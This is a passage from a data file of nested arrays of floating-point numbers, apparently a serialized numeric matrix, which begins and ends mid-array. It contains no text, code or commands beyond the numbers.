0.041243452578783035, 0.040320802479982376, 0.03605598956346512, 0.027183255180716515, 0.02000340074300766, 0.010596687905490398, -0.0026778976898640394, -0.016613813117146492, -0.023491838946938515], [-0.0994970053434372, -0.0904337540268898, -0.08407188206911087, -0.07402196526527405, -0.05915060639381409, -0.0452658049762249, -0.0370200052857399, -0.03144196793437004, -0.024558186531066895, -0.02065381035208702, -0.014803354628384113, -0.001234514405950904, 0.009789778850972652, 0.012434323318302631, 0.017930878326296806, 0.028576979413628578, 0.03616497665643692, 0.04540769010782242, 0.05153397098183632, 0.052578628063201904, 0.05771414563059807, 0.06682367622852325, 0.06823951750993729, 0.06775781512260437, 0.0675964504480362, 0.05834248661994934, 0.04908403754234314, 0.04862910881638527, 0.04609598591923714, 0.04162457212805748, 0.04090186581015587, 0.04170173034071922, 0.04117728769779205, 0.04532008245587349, 0.05168668180704117, 0.05653401464223862, 0.05789082124829292, 0.054025888442993164, 0.04693574830889702, 0.0418706014752388, 0.04111996665596962, 0.04295094683766365, 0.04263419285416603, 0.03780593350529671, 0.03079889342188835, 0.02637338638305664, 0.018849339336156845, 0.0044267610646784306, -0.011651703156530857, -0.019625937566161156], [-0.09852036833763123, -0.09228135645389557, -0.09079599380493164, -0.08205940574407578, -0.06647083163261414, -0.05008384585380554, -0.04041314125061035, -0.03600125014781952, -0.03562293201684952, -0.03500567376613617, -0.02674918808043003, -0.012534177862107754, -0.003408940974622965, -0.0018291014712303877, 0.006128213834017515, 0.018860772252082825, 0.02579977922141552, 0.035555168986320496, 0.043626148253679276, 0.044093187898397446, 0.0454300157725811, 0.051413096487522125, 0.05582275241613388, 0.05859878286719322, 0.06078687682747841, 0.05588528513908386, 0.05065291374921799, 0.052964936941862106, 0.05545354261994362, 0.055715207010507584, 0.05136663094162941, 0.04520421847701073, 0.0418996661901474, 0.048492588102817535, 0.057535383850336075, 0.06134963408112526, 0.06132876127958298, 0.054554395377635956, 0.044839706271886826, 0.03927752748131752, 0.03859790414571762, 0.03936714306473732, 0.03965035080909729, 0.036339130252599716, 0.030069028958678246, 0.025129936635494232, 0.020747793838381767, 0.011381363496184349, -0.00042309198761358857, -0.010258080437779427], [-0.09594127535820007, -0.09131953120231628, -0.09046141058206558, -0.08054814487695694, -0.06609367579221725, -0.056757133454084396, -0.050428345799446106, -0.044992007315158844, -0.045448679476976395, -0.04476354271173477, -0.03461936116218567, -0.02055094949901104, -0.01380973681807518, -0.01275604497641325, -0.0018348883604630828, 0.012520479038357735, 0.017836369574069977, 0.025448698550462723, 0.03286908566951752, 0.03237375244498253, 0.03148316964507103, 0.037484850734472275, 0.04579710215330124, 0.050072357058525085, 0.05160228908061981, 0.0514378547668457, 0.04928349703550339, 0.04805144667625427, 0.05319232866168022, 0.06143862009048462, 0.06168163940310478, 0.0523245744407177, 0.04489817097783089, 0.047212421894073486, 0.05485576391220093, 0.058648671954870224, 0.06017712876200676, 0.05247088521718979, 0.04033380374312401, 0.034932348877191544, 0.034166622906923294, 0.0319150947034359, 0.035084061324596405, 0.037989117205142975, 0.03221726045012474, 0.02362525649368763, 0.020601950585842133, 0.01892462745308876, 0.01570400781929493, 0.006303683388978243], [-0.09207430481910706, -0.08771320432424545, -0.08497509360313416, -0.07447654753923416, -0.06248466670513153, -0.06067414581775665, -0.05854007601737976, -0.05224952846765518, -0.04826263338327408, -0.04486196115612984, -0.03539451211690903, -0.0222037211060524, -0.01619892008602619, -0.01552564837038517, -0.007823719643056393, 0.002764605451375246, 0.007405424956232309, 0.0140878576785326, 0.020192285999655724, 0.01845412515103817, 0.019418606534600258, 0.030361443758010864, 0.0409713089466095, 0.04508759081363678, 0.04494002088904381, 0.045961644500494, 0.04459834843873978, 0.040890883654356, 0.04610591381788254, 0.0572572760283947, 0.06188332661986351, 0.053840186446905136, 0.04494157433509827, 0.04353521391749382, 0.049334436655044556, 0.05425316467881203, 0.05929284170269966, 0.05420646816492081, 0.04235706105828285, 0.03687557578086853, 0.03505836799740791, 0.030884157866239548, 0.03399307280778885, 0.0386255644261837, 0.03388522192835808, 0.025632906705141068, 0.0245208702981472, 0.026608889922499657, 0.0281198862940073, 0.02220214530825615], [-0.09168050438165665, -0.08725009113550186, -0.08140534907579422, -0.07223325222730637, -0.06381628662347794, -0.06232098489999771, -0.058773789554834366, -0.052490122616291046, -0.048636216670274734, -0.04584726691246033, -0.03729429841041565, -0.02333236299455166, -0.014937303029000759, -0.01347763929516077, -0.011749236844480038, -0.006574684754014015, -0.0003280762757640332, 0.004954494535923004, 0.006421316415071487, 0.003880245378240943, 0.0068962182849645615, 0.021648524329066277, 0.03518189862370491, 0.041780985891819, 0.042571935802698135, 0.04471466317772865, 0.04456271603703499, 0.03825868293642998, 0.03940412402153015, 0.047918081283569336, 0.05416955426335335, 0.050320353358983994, 0.043129339814186096, 0.04234478995203972, 0.049074240028858185, 0.05590178817510605, 0.06312981247901917, 0.05909934267401695, 0.047757092863321304, 0.03813140466809273, 0.03359822556376457, 0.030985258519649506, 0.03369079530239105, 0.03772416710853577, 0.036059632897377014, 0.030715003609657288, 0.03007102757692337, 0.034203559160232544, 0.03764840215444565, 0.03253740444779396], [-0.09120375663042068, -0.08627336472272873, -0.0777694508433342, -0.0716853067278862, -0.06786458194255829, -0.06258704513311386, -0.05395173653960228, -0.04797634482383728, -0.0472407303750515, -0.046633560210466385, -0.0385688878595829, -0.02639753557741642, -0.01748201996088028, -0.014708307571709156, -0.015461289323866367, -0.011180618777871132, -0.0018121326575055718, 0.002764658536761999, -0.0004342917527537793, -0.0025117502082139254, -0.001198957790620625, 0.009518858045339584, 0.02524326741695404, 0.03659098222851753, 0.04037630185484886, 0.04439741373062134, 0.048558205366134644, 0.04542570188641548, 0.041690099984407425, 0.04299182444810867, 0.047237578779459, 0.0488937646150589, 0.04579191654920578, 0.04604984074831009, 0.05293915048241615, 0.06044849380850792, 0.06564400345087051, 0.05909315496683121, 0.04864329844713211, 0.036607060581445694, 0.0339164137840271, 0.037062760442495346, 0.03889015316963196, 0.03933791443705559, 0.04125852510333061, 0.03920489177107811, 0.03677574172616005, 0.041609592735767365, 0.0453401543200016, 0.03875826671719551], [-0.08562473952770233, -0.07887572795152664, -0.06875122338533401, -0.06341878324747086, -0.06278788298368454, -0.06193358823657036, -0.05472376197576523, -0.04768393933773041, -0.04253038391470909, -0.03794076293706894, -0.02925124019384384, -0.021920498460531235, -0.01778523251414299, -0.016076017171144485, -0.016781816259026527, -0.012357883155345917, -0.003930851351469755, 0.0012488483916968107, -0.0007962698000483215, -0.0022417439613491297, -0.003226857865229249, 0.0030302973464131355, 0.018571509048342705, 0.030745074152946472, 0.03440583124756813, 0.039985157549381256, 0.04861463978886604, 0.05161665380001068, 0.04760724678635597, 0.04572056606411934, 0.049300435930490494, 0.054047781974077225, 0.053488731384277344, 0.05036058649420738, 0.05271054059267044, 0.057636700570583344, 0.059985920786857605, 0.05264309048652649, 0.044487081468105316, 0.03852260857820511, 0.04391811043024063, 0.05130113288760185, 0.05186037719249725, 0.04837764427065849, 0.04970134049654007, 0.047275055199861526, 0.04341382533311844, 0.04806576296687126, 0.053017329424619675, 0.04840881749987602], [-0.07669571787118912, -0.06932738423347473, -0.061256006360054016, -0.05655977129936218, -0.05638367682695389, -0.05869641155004501, -0.05562547594308853, -0.0493277981877327, -0.03783825412392616, -0.02705148234963417, -0.01775069162249565, -0.012403417378664017, -0.010334284044802189, -0.009905995801091194, -0.010736248455941677, -0.009037443436682224, -0.004990905988961458, 0.00043712626211345196, 0.002041056053712964, 0.000649818335659802, -0.000744409509934485, 0.003820844693109393, 0.01580667309463024, 0.025167196989059448, 0.027825992554426193, 0.033011361956596375, 0.043040644377470016, 0.0530368909239769, 0.05307585746049881, 0.05087845399975777, 0.052383050322532654, 0.05731545016169548, 0.05912569910287857, 0.054139088839292526, 0.0519498735666275, 0.05284230038523674, 0.052303340286016464, 0.046679358929395676, 0.04254201054573059, 0.04636763781309128, 0.06047918274998665, 0.07007426768541336, 0.07029417902231216, 0.06368192285299301, 0.06098531186580658, 0.055162250995635986, 0.05030183121562004, 0.0535692535340786, 0.05866939574480057, 0.05583047866821289], [-0.0729847252368927, -0.06627751141786575, -0.060923002660274506, -0.055942218750715256, -0.052458181977272034, -0.05029137060046196, -0.05055646598339081, -0.048628997057676315, -0.03625908121466637, -0.022920828312635422, -0.014244960620999336, -0.005860988982021809, 0.0002927382884081453, 0.0006329523748718202, 0.0008162409067153931, -0.001356674823909998, -0.003400831250473857, 0.000570911739487201, 0.005046964623034, 0.002499207155779004, 0.0031330420169979334, 0.009684992022812366, 0.01530527975410223, 0.021380295976996422, 0.027893193066120148, 0.03172903507947922, 0.03678886592388153, 0.04699130356311798, 0.051794104278087616, 0.052282728254795074, 0.0529540479183197, 0.05714196339249611, 0.06190577521920204, 0.06224436312913895, 0.0605805367231369, 0.05793825536966324, 0.0548381544649601, 0.05283903330564499, 0.053501203656196594, 0.06164689362049103, 0.07500611990690231, 0.08310738205909729, 0.08613929152488708, 0.08094499260187149, 0.07263990491628647, 0.06173664703965187, 0.05724301189184189, 0.059183329343795776, 0.0626583844423294, 0.05811070278286934], [-0.0744047611951828, -0.06661121547222137, -0.05778292194008827, -0.05132988467812538, -0.04773930087685585, -0.04542621597647667, -0.04725547507405281, -0.04670099541544914, -0.03511865437030792, -0.021753735840320587, -0.013384822756052017, -0.004892658907920122, 0.0018393161008134484, 0.0022901413030922413, 0.004756948910653591, 0.003932665567845106, 0.0012662606313824654, 0.005272942595183849, 0.010530304163694382, 0.00753386365249753, 0.008879357017576694, 0.015481129288673401, 0.01711242087185383, 0.021632038056850433, 0.031617533415555954, 0.0358281210064888, 0.037016693502664566, 0.0413917601108551, 0.04614898934960365, 0.05020054802298546, 0.056598324328660965, 0.06380542367696762, 0.07010508328676224, 0.07445313781499863, 0.07551109790802002, 0.07358115166425705, 0.07119590789079666, 0.07133517414331436, 0.07367874681949615, 0.07811740040779114, 0.08475753664970398, 0.09061884135007858, 0.09584487974643707, 0.09367965906858444, 0.08382481336593628, 0.07081098109483719, 0.0655776634812355, 0.06586182862520218, 0.06731721013784409, 0.06077421456575394], [-0.07587684690952301, -0.06611280143260956, -0.051968950778245926, -0.04477093368768692, -0.04352341964840889, -0.042962729930877686, -0.04382461681962013, -0.04227077215909958, -0.03306322917342186, -0.021503811702132225, -0.012938950210809708, -0.0062689101323485374, -0.0008781708311289549, 0.0003584538062568754, 0.0033832434564828873, 0.0046615940518677235, 0.005580609664320946, 0.012767360545694828, 0.019537631422281265, 0.017403189092874527, 0.01878228783607483, 0.02311268262565136, 0.02186591923236847, 0.02347494661808014, 0.03254484385251999, 0.038361016660928726, 0.040484435856342316, 0.04229145869612694, 0.04571910947561264, 0.05153011158108711, 0.0618261881172657, 0.07155729085206985, 0.0787208303809166, 0.08627744764089584, 0.0906672403216362, 0.0908808633685112, 0.08989408612251282, 0.08990921080112457, 0.09168842434883118, 0.09303510189056396, 0.09555669128894806, 0.09904012829065323, 0.10379011929035187, 0.1047229990363121, 0.09707741439342499, 0.08443465828895569, 0.07497173547744751, 0.07071534544229507, 0.0687241181731224, 0.06253049522638321], [-0.07319462299346924, -0.062826968729496, -0.048564281314611435, -0.04408793896436691, -0.045538391917943954, -0.043133657425642014, -0.03814995661377907, -0.03376597538590431, -0.02878376469016075, -0.021158842369914055, -0.012712196446955204, -0.00748506560921669, -0.001857266528531909, 0.001986609073355794, 0.0019442117772996426, 0.002753452630713582, 0.010561231523752213, 0.02138751931488514, 0.027005566284060478, 0.026253320276737213, 0.02881169319152832, 0.03080877475440502, 0.027651382610201836, 0.02437628246843815, 0.028563907369971275, 0.03736506402492523, 0.0457790307700634, 0.0511152483522892, 0.053433772176504135, 0.058376461267471313, 0.06667688488960266, 0.07588353753089905, 0.08315637707710266, 0.09333010762929916, 0.10040496289730072, 0.1022476926445961, 0.10302799195051193, 0.10145317018032074, 0.10058818757534027, 0.10383369773626328, 0.10864445567131042, 0.10929521173238754, 0.10910472273826599, 0.1120331659913063, 0.11019075661897659, 0.10265932232141495, 0.08826731890439987, 0.07596635073423386, 0.06657232344150543, 0.06121792271733284], [-0.06671939045190811, -0.05787954851984978, -0.048358287662267685, -0.04684760048985481, -0.04887625575065613, -0.045718543231487274, -0.037592001259326935, -0.030020520091056824, -0.022300487384200096, -0.014608645811676979, -0.0084692919626832, -0.00683223083615303, -0.0025493763387203217, 0.0031190013978630304, 0.004004475194960833, 0.0071013993583619595, 0.018455905839800835, 0.02695881389081478, 0.026438452303409576, 0.02489495649933815, 0.028023336082696915, 0.030205681920051575, 0.028155677020549774, 0.025035260245203972, 0.02900056540966034, 0.0387614369392395, 0.048804737627506256, 0.055092547088861465, 0.05742063373327255, 0.06365776807069778, 0.07444658130407333, 0.08461607247591019, 0.09023047983646393, 0.09622693806886673, 0.10086056590080261, 0.10351927578449249, 0.10706273466348648, 0.10613041371107101, 0.10347005724906921, 0.10851199179887772, 0.11616918444633484, 0.11651153117418289, 0.112851083278656, 0.11410123109817505, 0.11447994410991669, 0.1126314029097557, 0.10224220901727676, 0.0888015404343605, 0.07546214014291763, 0.06754584610462189], [-0.06309422850608826, -0.055820535868406296, -0.05093444883823395, -0.05011000484228134, -0.050150834023952484, -0.047380752861499786, -0.03994423523545265, -0.030525827780365944, -0.01758396439254284, -0.007890701293945312, -0.0047643352299928665, -0.007697308901697397, -0.005726831499487162, 0.0009259398793801665, 0.007174248807132244, 0.014608415775001049, 0.02464316412806511, 0.02620958350598812, 0.018948616459965706, 0.0166443083435297, 0.02155260555446148, 0.0273492019623518, 0.02894843928515911, 0.02941272221505642, 0.03579104319214821, 0.044749900698661804, 0.052320681512355804, 0.056004736572504044, 0.05832286924123764, 0.06641313433647156, 0.08016319572925568, 0.09082683175802231, 0.09447242319583893, 0.09527291357517242, 0.09664587676525116, 0.09979182481765747, 0.1064046323299408, 0.10812979936599731, 0.10506080090999603, 0.10902076214551926, 0.1166270524263382, 0.11900096386671066, 0.11640793830156326, 0.11625711619853973, 0.11587518453598022, 0.11635137349367142, 0.11150495707988739, 0.10120559483766556, 0.08824162930250168, 0.07779219001531601], [-0.06367696076631546, -0.05724635347723961, -0.05736641213297844, -0.054812997579574585, -0.048734866082668304, -0.04399237409234047, -0.040087711066007614, -0.031901076436042786, -0.017464864999055862, -0.007647427264600992, -0.007187114097177982, -0.011565763503313065, -0.008574150502681732, -0.0010353595716878772, 0.010972855612635612, 0.019166935235261917, 0.022509509697556496, 0.01640436053276062, 0.009443327784538269, 0.01057459693402052, 0.01975260116159916, 0.02953900210559368, 0.03443644940853119, 0.03679269179701805, 0.04204491525888443, 0.04922615364193916, 0.0548025406897068, 0.05781171843409538, 0.06170766428112984, 0.07012632489204407, 0.07858778536319733, 0.08458004891872406, 0.08762534707784653, 0.0891418308019638, 0.09159834682941437, 0.09524928778409958, 0.10244493186473846, 0.10647609829902649, 0.10496216267347336, 0.10735982656478882, 0.1140318363904953, 0.12026156485080719, 0.12291846424341202, 0.122868113219738, 0.1200723797082901, 0.1178489699959755, 0.11278115957975388, 0.10471121221780777, 0.09489795565605164, 0.08607007563114166], [-0.06955478340387344, -0.06251604110002518, -0.06210186332464218, -0.0577295646071434, -0.048939116299152374, -0.04271727427840233, -0.040739212185144424, -0.034176722168922424, -0.02114109694957733, -0.01183833833783865, -0.01098609808832407, -0.011765191331505775, -0.005185718648135662, 0.001967101823538542, 0.011221571825444698, 0.013100449927151203, 0.011326336301863194, 0.0059747472405433655, 0.006993846967816353, 0.012081238441169262, 0.021330704912543297, 0.02837303653359413, 0.03348516672849655, 0.03691650554537773, 0.04232294112443924, 0.04873865470290184, 0.05254994332790375, 0.05328674986958504, 0.056499019265174866, 0.06471015512943268, 0.07200483977794647, 0.0768285021185875, 0.08046575635671616, 0.08563535660505295, 0.09144067764282227, 0.09562159329652786, 0.09808629751205444, 0.09857671707868576, 0.09759590029716492, 0.09906435012817383, 0.10504961013793945, 0.11330132931470871, 0.11977969110012054, 0.12126903980970383, 0.11787456274032593, 0.11600284278392792, 0.11353093385696411, 0.1076122522354126, 0.10054931789636612, 0.09445149451494217], [-0.07104654610157013, -0.06395328789949417, -0.06317837536334991, -0.06023484095931053, -0.05324184149503708, -0.046927958726882935, -0.0446234792470932, -0.03855572268366814, -0.02561783231794834, -0.015103527344763279, -0.011802224442362785, -0.007869998924434185, 0.0008580202120356262, 0.0059761893935501575, 0.008576999418437481, 0.003653622232377529, -0.0003311189357191324, -0.002804894233122468, 0.0038095919881016016, 0.010757056064903736, 0.0183569248765707, 0.021582838147878647, 0.025901665911078453, 0.030089709907770157, 0.036514826118946075, 0.04230879247188568, 0.044446639716625214, 0.04281611740589142, 0.04429022595286369, 0.05242408439517021, 0.06385888904333115, 0.07187934219837189, 0.07616078853607178, 0.08138690143823624, 0.08813794702291489, 0.09364131093025208, 0.09228182584047318, 0.08775504678487778, 0.0854833573102951, 0.08647340536117554, 0.09297157824039459, 0.1017100140452385, 0.10918616503477097, 0.11179174482822418, 0.10961181670427322, 0.11112705618143082, 0.1143745705485344, 0.11170708388090134, 0.10637790709733963, 0.10022692382335663], [-0.0650733932852745, -0.05891033262014389, -0.062368202954530716, -0.06549137085676193, -0.06234319880604744, -0.05361171066761017, -0.04822827875614166, -0.04244650900363922, -0.030347635969519615, -0.019154870882630348, -0.012751828879117966, -0.0022575079929083586, 0.0065156989730894566, 0.006062200292944908, 0.0028898650780320168, -0.004425670485943556, -0.01138807088136673, -0.015193823724985123, -0.007507794536650181, 0.0007684684824198484, 0.010507049970328808, 0.016191255301237106, 0.021000659093260765, 0.024351773783564568, 0.027222396805882454, 0.02893454022705555, 0.029644956812262535, 0.032518088817596436, 0.03753553330898285, 0.04548992961645126, 0.055763620883226395, 0.06530016660690308, 0.07102658599615097, 0.07334049046039581, 0.07949962466955185, 0.08893871307373047, 0.08922996371984482, 0.08079899847507477, 0.0749422237277031, 0.07347427308559418, 0.08174799382686615, 0.09184441715478897, 0.10101889818906784, 0.10437479615211487, 0.10363008081912994, 0.10294629633426666, 0.10510421544313431, 0.10792793333530426, 0.10832475870847702, 0.10055568814277649], [-0.060713112354278564, -0.054369159042835236, -0.05818089097738266, -0.06490570306777954, -0.06616797298192978, -0.06061140075325966, -0.055468495935201645, -0.049091581255197525, -0.03536996617913246, -0.022809546440839767, -0.015624831430613995, -0.004822821822017431, 0.0007301010773517191, -0.0028725930023938417, -0.0033046663738787174, -0.0055900271981954575, -0.015271404758095741, -0.02527446672320366, -0.022810472175478935, -0.014084316790103912, -0.0016574887558817863, 0.007044285535812378, 0.012160097248852253, 0.015730369836091995, 0.018798910081386566, 0.018502021208405495, 0.017267966642975807, 0.02137904241681099, 0.02954188920557499, 0.03829551488161087, 0.044974878430366516, 0.05328576639294624, 0.05977138504385948, 0.06162653863430023, 0.06850098073482513, 0.08126766979694366, 0.08814199268817902, 0.08167076110839844, 0.07319860905408859, 0.06713259965181351, 0.07297118008136749, 0.08229775726795197, 0.09034639596939087, 0.092264324426651, 0.09319084882736206, 0.09110527485609055, 0.0914417952299118, 0.09770406037569046, 0.10362734645605087, 0.09838449954986572], [-0.06121376156806946, -0.053919218480587006, -0.05388696491718292, -0.05945907160639763, -0.06281699985265732, -0.06312074512243271, -0.06040644645690918, -0.05264177918434143, -0.03682023286819458, -0.02421005629003048, -0.019446680322289467, -0.013591650873422623, -0.011427530087530613, -0.014086510054767132, -0.010107642970979214, -0.008928961120545864, -0.019984422251582146, -0.03239373117685318, -0.03186241164803505, -0.022851061075925827, -0.010925215668976307, -0.003741129068657756, 0.0004574620979838073, 0.004758037161082029, 0.011034619063138962, 0.011561814695596695, 0.008531852625310421, 0.009301961399614811, 0.018162600696086884, 0.029385969042778015, 0.0369257852435112, 0.04461543634533882, 0.05057593807578087, 0.05372864753007889, 0.06106080114841461, 0.0735287219285965, 0.08317549526691437, 0.07949342578649521, 0.07067396491765976, 0.061192940920591354, 0.061980634927749634, 0.06872566789388657, 0.07471885532140732, 0.07592989504337311, 0.0787397176027298, 0.07999305427074432, 0.08324380964040756, 0.08945362269878387, 0.09648939222097397, 0.09609562903642654], [-0.057244300842285156, -0.05120433121919632, -0.05173971503973007, -0.05502396076917648, -0.057689227163791656, -0.06279968470335007, -0.05949772149324417, -0.04754360392689705, -0.032742563635110855, -0.022355541586875916, -0.018745524808764458, -0.020912859588861465, -0.02548169158399105, -0.025763683021068573, -0.019534755498170853, -0.018386321142315865, -0.028631258755922318, -0.03494706749916077, -0.030630910769104958, -0.024889782071113586, -0.015529346652328968, -0.00596261490136385, -0.0009351445478387177, 0.0009953175904229283, 0.003438460873439908, 0.002566945506259799, -0.0011382651282474399, 0.00019226991571485996, 0.012149094603955746, 0.02647254429757595, 0.03524382412433624, 0.04187509045004845, 0.04778238758444786, 0.05146622285246849, 0.0543837808072567, 0.06122706085443497, 0.07000765204429626, 0.07169272005558014, 0.06543020904064178, 0.05755284056067467, 0.05360965058207512, 0.05565157160162926, 0.06195669621229172, 0.06760479509830475, 0.0711459293961525, 0.07523837685585022, 0.08063936978578568, 0.08230636268854141, 0.08323808759450912, 0.08520501852035522], [-0.04850172623991966, -0.045086849480867386, -0.0502140074968338, -0.052767232060432434, -0.052537333220243454, -0.0549221970140934, -0.04744706675410271, -0.033395882695913315, -0.026847630739212036, -0.02375856600701809, -0.020831501111388206, -0.0240345261991024, -0.029224194586277008, -0.02758818492293358, -0.02265034429728985, -0.024249110370874405, -0.032611530274152756, -0.034106433391571045, -0.028858499601483345, -0.027200134471058846, -0.01959920860826969, -0.006107456982135773, 0.0002282079658471048, 0.0006585312657989562, 0.0006583295180462301, -0.0010673500364646316, -0.004887684248387814, -0.0024058057460933924, 0.01100943237543106, 0.025391051545739174, 0.031635139137506485, 0.03589640185236931, 0.042236123234033585, 0.04712356626987457, 0.04655129835009575, 0.04781215265393257, 0.05135625600814819, 0.05387232452630997, 0.04987897351384163, 0.047906965017318726, 0.0455312617123127, 0.04572097957134247, 0.05499007925391197, 0.06680403649806976, 0.07064627856016159, 0.0753917470574379, 0.08024962246417999, 0.07711873948574066, 0.0711154192686081, 0.0721004456281662], [-0.04288571700453758, -0.04005184769630432, -0.04539710283279419, -0.047304410487413406, -0.04528298228979111, -0.043841343373060226, -0.034675341099500656, -0.022209113463759422, -0.022583352401852608, -0.026051335036754608, -0.02588832937180996, -0.027161402627825737, -0.029410813003778458, -0.027476774528622627, -0.02211773954331875, -0.021968629211187363, -0.02765529416501522, -0.030683478340506554, -0.030095165595412254, -0.029908541589975357, -0.02261413261294365, -0.008977853693068027, -0.002709068590775132, -7.418223685817793e-05, 0.004815218038856983, 0.004578979220241308, -0.0006177151226438582, -0.0022468739189207554, 0.007558110170066357, 0.018773656338453293, 0.020900731906294823, 0.023003360256552696, 0.029421553015708923, 0.03615183383226395, 0.03671018034219742, 0.03703968599438667, 0.03761431202292442, 0.037643030285835266, 0.03325999900698662, 0.03404085338115692, 0.03573943302035332, 0.03864147141575813, 0.05051606148481369, 0.06413562595844269, 0.06838274747133255, 0.07317540049552917, 0.07767818123102188, 0.0737605020403862, 0.06674660742282867, 0.06696069985628128], [-0.043088190257549286, -0.03993033245205879, -0.04374142736196518, -0.04579766094684601, -0.04235529154539108, -0.035136155784130096, -0.026627497747540474, -0.019033538177609444, -0.01962791569530964, -0.02292010933160782, -0.026067223399877548, -0.029943922534585, -0.03240709751844406, -0.03069712594151497, -0.026454249396920204, -0.023084016516804695, -0.02357385866343975, -0.029092103242874146, -0.03461135923862457, -0.032455481588840485, -0.022143373265862465, -0.007591591216623783, 0.0006635865429416299, 0.0075921230018138885, 0.014778690412640572, 0.012959285639226437, 0.004877239931374788, -0.00098619784694165, 0.004997379146516323, 0.014195731841027737, 0.017630819231271744, 0.017626523971557617, 0.019680358469486237, 0.02231777273118496, 0.023688269779086113, 0.024765970185399055, 0.026522507891058922, 0.026406196877360344, 0.021707674488425255, 0.022334182634949684, 0.02505245804786682, 0.030465707182884216, 0.04480009526014328, 0.06003927066922188, 0.06515728682279587, 0.06925018876791, 0.07531572878360748, 0.07569468021392822, 0.07214803993701935, 0.06814651936292648], [-0.04201648756861687, -0.038620948791503906, -0.040417611598968506, -0.04219970852136612, -0.03842165693640709, -0.03057989664375782, -0.026804622262716293, -0.02511787600815296, -0.022754143923521042, -0.021602613851428032, -0.02510450966656208, -0.0294115599244833, -0.03121335059404373, -0.02983132191002369, -0.0295267216861248, -0.026664774864912033, -0.02388046123087406, -0.028593052178621292, -0.03400694578886032, -0.028188135474920273, -0.01722361333668232, -0.006454578600823879, 0.0032078749500215054, 0.013056694529950619, 0.017779851332306862, 0.012795241549611092, 0.0037632561288774014, -0.0012223124504089355, 0.003055129898712039, 0.010468882508575916, 0.01639985665678978, 0.015152325853705406, 0.013646121136844158, 0.014114475809037685, 0.017240412533283234, 0.017765410244464874, 0.0179829690605402, 0.016026010736823082, 0.011551624163985252, 0.011775949969887733, 0.014187405817210674, 0.02059408463537693, 0.03628482669591904, 0.05306840315461159, 0.059831153601408005, 0.06272450089454651, 0.06936918199062347, 0.07521065324544907, 0.07871489971876144, 0.07554060220718384], [-0.036698464304208755, -0.03393173962831497, -0.034713469445705414, -0.03474155068397522, -0.030555693432688713, -0.026138661429286003, -0.026746219024062157, -0.028827844187617302, -0.02977691777050495, -0.028647245839238167, -0.028403669595718384, -0.02486094832420349, -0.020995941013097763, -0.0194436926394701, -0.022098692134022713, -0.022955788299441338, -0.022102560847997665, -0.026646187528967857, -0.030368350446224213, -0.023927494883537292, -0.01613985188305378, -0.01126838382333517, -0.0027357416693121195, 0.007831627503037453, 0.012819844298064709, 0.008432223461568356, 0.0008495327201671898, -0.0024376241490244865, 0.0006328783347271383, 0.005528655834496021, 0.009294756688177586, 0.008124634623527527, 0.00900265946984291, 0.014561562798917294, 0.019840316846966743, 0.01714039221405983, 0.010211208835244179, 0.0032672134693711996, -0.0005801885272376239, 0.0016091796569526196, 0.0051061916165053844, 0.010371903888881207, 0.025364061817526817, 0.04305609315633774, 0.05201347544789314, 0.055714525282382965, 0.062119897454977036, 0.06964317709207535, 0.077232226729393, 0.08002301305532455], [-0.028284071013331413, -0.02712857909500599, -0.02960723452270031, -0.027621546760201454, -0.022537998855113983, -0.022572439163923264, -0.024919481948018074, -0.026725711300969124, -0.032328639179468155, -0.03530697524547577, -0.032297465950250626, -0.02230718731880188, -0.015463055111467838, -0.015274935401976109, -0.017042990773916245, -0.015587914735078812, -0.015433556400239468, -0.02127053402364254, -0.02744349278509617, -0.02300160750746727, -0.016267606988549232, -0.010871335864067078, -0.0031914073042571545, 0.003646830329671502, 0.005600887816399336, 0.004238035064190626, 0.0007575135095976293, -0.0036973366513848305, -0.004726582206785679, -0.002699064090847969, 0.00045010470785200596, 0.004212376661598682, 0.010394332930445671, 0.019549788907170296, 0.02546493336558342, 0.022348206490278244, 0.00998328160494566, -0.0039034229703247547, -0.009329428896307945, -0.008330412209033966, -0.004524636082351208, -0.0004555039049591869, 0.012942727655172348, 0.03260901942849159, 0.047057557851076126, 0.0567135214805603, 0.0625305101275444, 0.06686031818389893, 0.07042854279279709, 0.07357078045606613], [-0.025853751227259636, -0.025247616693377495, -0.027899496257305145, -0.022955721244215965, -0.016199225559830666, -0.01811528019607067, -0.01895546168088913, -0.017225587740540504, -0.02307267114520073, -0.029766766354441643, -0.027594471350312233, -0.01882159896194935, -0.015245256945490837, -0.017490630969405174, -0.01821405254304409, -0.012438512407243252, -0.010246948339045048, -0.014183330349624157, -0.020944250747561455, -0.018604237586259842, -0.011799212545156479, -0.003482686821371317, 0.0029719998128712177, 0.004535115789622068, 0.0033717656042426825, 0.005902822129428387, 0.007054631598293781, 0.0004121628007851541, -0.005610398016870022, -0.00659339502453804, -0.00376663520000875, 0.00576635729521513, 0.01579686440527439, 0.02033909782767296, 0.02198716253042221, 0.02187873050570488, 0.01469600573182106, 0.0011446797288954258, -0.006721870042383671, -0.010269632562994957, -0.008119024336338043, -0.004700131714344025, 0.004071385599672794, 0.02142786979675293, 0.04117082059383392, 0.05918937176465988, 0.06556602567434311, 0.06453650444746017, 0.06043701246380806, 0.06134191155433655], [-0.0246367659419775, -0.022239821031689644, -0.021303324028849602, -0.013842333108186722, -0.006134754978120327, -0.007745285984128714, -0.008166473358869553, -0.005833346862345934, -0.010691291652619839, -0.018961872905492783, -0.020147932693362236, -0.014540055766701698, -0.012891260907053947, -0.01567992940545082, -0.0188374575227499, -0.013934175483882427, -0.008378622122108936, -0.005526767577975988, -0.005807261448353529, -0.0021813276689499617, 0.002082070568576455, 0.005002067424356937, 0.007553841453045607, 0.006634872872382402, 0.005615130998194218, 0.008801767602562904, 0.010999803431332111, 0.006071712821722031, 0.00015355007781181484, -0.002138839801773429, -0.0022856066934764385, 0.0059028202667832375, 0.015087410807609558, 0.015651719644665718, 0.015092829242348671, 0.017224201932549477, 0.017028683796525, 0.00855258945375681, 0.0006306880968622863, -0.004254054743796587, -0.0035523639526218176, -0.001630070386454463, 0.001663894159719348, 0.013065610080957413, 0.03274749964475632, 0.052274614572525024, 0.05851295217871666, 0.05584030598402023, 0.05198100954294205, 0.05733688920736313], [-0.01878304034471512, -0.016055775806307793, -0.010554964654147625, -0.0030537170823663473, 0.002602097112685442, 0.0030220155604183674, 0.002381180413067341, 0.0012994547141715884, -0.004306370858103037, -0.011114909313619137, -0.014060156419873238, -0.013264289125800133, -0.0147475590929389, -0.016406171023845673, -0.01718311384320259, -0.010812613181769848, -0.0027535180561244488, 0.005525027401745319, 0.010362397879362106, 0.014119066298007965, 0.01648600772023201, 0.015902094542980194, 0.014484993182122707, 0.010879592970013618, 0.010581192560493946, 0.014047416858375072, 0.01741311326622963, 0.016348684206604958, 0.010696761310100555, 